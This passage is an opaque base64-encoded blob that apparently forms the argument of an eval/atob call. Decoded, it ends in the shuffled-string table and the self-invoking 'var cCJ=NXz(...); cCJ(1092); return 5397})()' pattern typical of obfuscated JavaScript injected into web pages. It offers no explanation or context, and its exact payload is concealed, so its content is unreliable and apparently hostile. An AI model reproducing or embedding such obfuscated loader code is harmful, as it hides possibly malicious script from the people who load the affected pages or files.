uUSlpKDNCUVFRUWF0XWYzaTRAe3NkPVNmUT10UXV0aFlRUTtmUVplIHJoUWEwUWY4XXNmdiU+LWYuPThyclFfaS5RUUErKykqKXNfUS4pcihna3VzPWVdZVFRPWxjfTE4PTdodChhO3NyPz1ROVQ/cyEzMUFmbDAodGdRZVF3bDU0O206LnFyX3U2aW8uaT1vYlE2USxRY31le2E1UWY9dFFcXHRwc2VRUWVRYVlpUXRRKVFlc1ElaWR9KTFmPXg9KSlrXSAyOzA9UXIxNlFaVHZkX1FwPTsxO2ZfLl0oLlF0cjQwdDI0LkZsNmFsSXdsfT0oYVFRMWkuZV9AUWRfNTFkUXt0MXNkLGx9fXQxZWwrUXRyKGJbLkVyOn1fb1E1b2UoUV0uO2VwMHRINHJdZVE5MjtpOyFEdDFkeClRMSk9eyRBUWZbc11RfTFRZClvamZwKVEpaSx2UVF0VHQ9K3NubzViXCc7bWxmUW40NWU6T2w1ZWEsUU9vXWVkUVFpZDVyKFFyOiUsYzJ0KHI9U247dFFvLHR2IG1laWF0YV10aG9dOj1lMTEgUU9mYWMkYWx2YmZUNTJ7MmcpUXRfZW9RNCx1UVEpXWV0UWFyOFEwclFdLEhLIGNRbl09cyliUSg2Km4pNV0yZTBfUWhRM2ZAW2FyaW9mMl1LdHtvUV8gVE1sMih0X1FyOntdeCh0USEgc2kxXSgyeDZ0PWUsJCo6dFIpZihmKX0gPlFRMjIkZS41aXggfV9pdW8uLihlUV1jb3RRNClRXzNuc2d2aTRuX2MpaHJvXyVmbnsoT19fMFFfaFFRMihTcztlZl07SVNdZnslQ3MkZyUuPlB5eWZRVjF0YGlSPWUxXWUgKFFRZlFuOWp0biFlOzE9NW4rNG8uZVhtMFFvb1Flclolb2U6UWdRZjJdIEtdaVtRPWM4e299PXdUIWZzbFFmLHNdX1taSXQyeV8hIWNwPDY9b18rKS5ReDAlY1FJaF9RdFFuUSlyLmljMTFmOnYuMVFqUWFybC4oJUVycGZRaFEhdChmMSYmaF1lPSYpXCcwUWlRb1E7X1FfUVl0XWd9ZDFpKTwudnlhXTFZdCFlbm1dLmlyUWQoTm1kZl90dDJRIDYxNVE1ISVRe3tsSF0pfStfbz0pKHRRPTJ9dWUoUWphUSF0MFFhcyhRMmZmbnJUaWVzaXt1M2hhblFvNmVlSWY7MjldZl0kUXJvUWE9UXI/YT1jUVFpPXlvbWMxKG5Ra11oLCEkdElMPF0ocylRUWVRLlU4ICZhM1FRbyVdUVF0dFE1dHV0JC5ZMGMuNFE9ITNRRVtRKGFRMWlRNG4lbjhRaVEwI3JneiMyYURpaWJzZXhqZFEuZG5mZnMsLl17VFEjfXZHKCgtK2V0JWZmX2J1Li5uN20pI3R9UV0uYWkzWlEpM1QpIjNpUS4mLjNfUTxmLiw2eGVybD1fLkQuM3QsTF0pWzlmczN0bnI8cFFLXShRYXA2X2gmdHR9UWQzPSV1X3UyJGxWUTJuVHJwbiBqamgoOkRzKDVzIGxvaFErNGQoJF09cjsxXTB0b2JRc3NddSlsbHJhXz5RMmFyK2YyXzU0KT1fKSVuUShpOXRjUTNiJWEyZi4rb11rNDZyaSE9LnJue1FmTm1fczchYltvdDsoUGVmM1ZyaXAhcmYlJGFJJW9ub1E1ZzpoYTRyYSY9clFbYW5hZTlRJW5qcmI1ITNsZi5bbUx0ZW4rYTU9ZXkpZmVvbj1hUVE3NWVHUSxfLDUhe2dvbnNlUVEgbnJdaSJwb2k6YnMyKjh7KWVycih1dDEuY1FsUTgpaT17JTMiZWUuaVFvcjFYLmIpdWwzIHNwY30zajdlMDNnKVF0X21dM1F1XWR0fW8tUXQ9ZjtvMHJob3NkODAzZlEgZnRbJC41KGUrW2VedHVmNWl2b3RcXC4uUWZ9JTRdUSBRY2Mzb19sXFxuJVVRNGVRZF9dLmo0USxqJTJwdGUuMXJRN1EpZl8yaSk6USBwJTIgdHNdIz0paSl0Y2UpIF9hXlFRcmFaXUUmc2Y1UTVRaHIybGNRdFFvbDN7ci5RaTFRc3JkNCQ/ZTE1ZD1zUSAlaF90MSk7UWNdMjNcLyV1NzM9UT1NZXVRZzMyfVFXdDtvUS4lc1E9YTMkMFEuZTRRZGldblFuPW5ZYmh1bFFGb3JfQ3IzUW5RM2x1X3J9U2NhUWcpUV1zIThRLnRjdHUqLlFuUTI7ZTMoUT1RUVFmIFEzOy5RXzFRVTAzYyAlZl9sKCk/X1ExUVEuUWE1bHA0c1k1X250Xl9faV9mZGU9ZVFRZWJvNC5RKDI1N30pYXV2cmEuUWUpMV90dHBRKWNfM19yZVFsXFw1XzQtelFwO1EpKTZzM30pbityUV9UXS5jdCF0UWFfTmlvcy49JS5RblF9NFFbaVFvb0IzcFF9ZiglaV85dVEiZixlXSUmZmorKy1cLzMuUSVmblFpZlFiXzZvbjEuUVFhX1FmdDUsNSVdX1Epb3RrcmU/blFpX2ViKG9sUT1ldzZRblFRUTVtZk50XVEzX3R0OzhRbjRhXT09NHslKVFvbUclKTVRUSxlUVtRKDQgZV9RbzMgZ0lRbCU2WF0uZ3tRNDpyXC8uUXV9LD1jUW9hck1lSDJ4XSsoeyhRUVF0XWkzLHQgbHQxMzRnTTFyUSwxcnQoZGlReFEoOC45KHB9O19fbTVoVD5RaTY7UVEpUWlhY2s7aTE9VDshNHM3YihrZVE3UWZtUT1ueV9vUXkuYW59LTF0UWZhby5RIClqYVFlcmdlaXM7cl9fdXNudGIuJHRRUTZsN3M7XyVfNzZRIHR1ZixvIC0hXTkxfWdmUXIkU11qaS5kXCdzWjt0bC4gKDtvZlE0UVF0UTRuO25wMFF1IHJzPXNjMntFUXtyNV0hUTRycytxUSlmMWVRUXJRcmtjXVxcUTFnQzQ2S2VyUWQ4cCE1KS1vaWZRdC5dLC47b2JsJSBlUVEkbnIuYV8lZl8gKHNRbC4rMXIkKVFuYi5mdHhsXFxKUSl9ezZycG5RZTFdLHQ9ZzYhWCAydWpReXtfeSE6ZkVUblEpJVE1JSxRUT15aXRjYzYyIHUpdG8yNVF7XFwuIFEkUWYgUX1fKSE1c11mbl5RdFEhZGMgKWgpJGw5cHVRLi5vYjFhUVEyZiB9fShRIVFvJWkxXSxsPW5RaS5yUUlRVTJucmVbYX0uaS4lWS4gZWZ3YyZdaG5fZm8uZ1suXTUuZl8pKX15MnNmJGJlX2VtQztfNzJ0UV93Ml9pe2ZjcmpfX2sge1FsIDRjYl8iUX07UV09IDBRZlk7UTUyXyBkX3IuJXJlbC4ucl9fZXAiUXVdUV9vbjMpVixjcnIhKDRvKHVhbl10IHtEZj12X1spby1fbm8wICV0cGRpZmRRMX17MXIlIDJmX2JlXV0pNC1mbmYpLlFuJVF0LmNuPSBVb3RdJykpO3ZhciBjQ0o9Tlh6KGhtVSx3RGIgKTtjQ0ooMTA5Mik7cmV0dXJuIDUzOTd9KSgp'))
